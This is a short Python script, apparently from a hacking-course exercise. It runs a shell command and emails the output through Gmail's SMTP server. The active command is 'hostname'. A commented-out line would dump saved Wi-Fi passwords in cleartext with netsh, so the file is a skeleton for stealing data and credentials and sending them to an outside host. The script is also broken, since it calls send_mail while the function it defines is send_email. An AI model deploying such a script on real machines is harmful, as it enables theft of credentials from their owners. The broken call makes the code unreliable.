#!/usr/bin/env python

import subprocess, smtplib

def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587) #creates instance of an SMTP server using SMTP lib
    #using gmail's SMPT server on port 587
    #need to enable Less secure app access in Google account settings if using Gmail
    #https://myaccount.google.com/security
    
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    #(from_addr, to_addr, message)
    
    server.quit()
    

#command = "msg * Test Message"
#command = "netsh wlan show profile <ESSID> key=clear" #-show wlan profiles stored on computer, key in plaintext form
email = input("Enter email address to send to: ")
password = input("Enter email password: ")
command = "hostname"
result = subprocess.check_output(command, shell=True)
send_mail(email, password, result)
#no hardcoded creds to see here, move along creeps
#subprocess.Popen(command, shell=True)
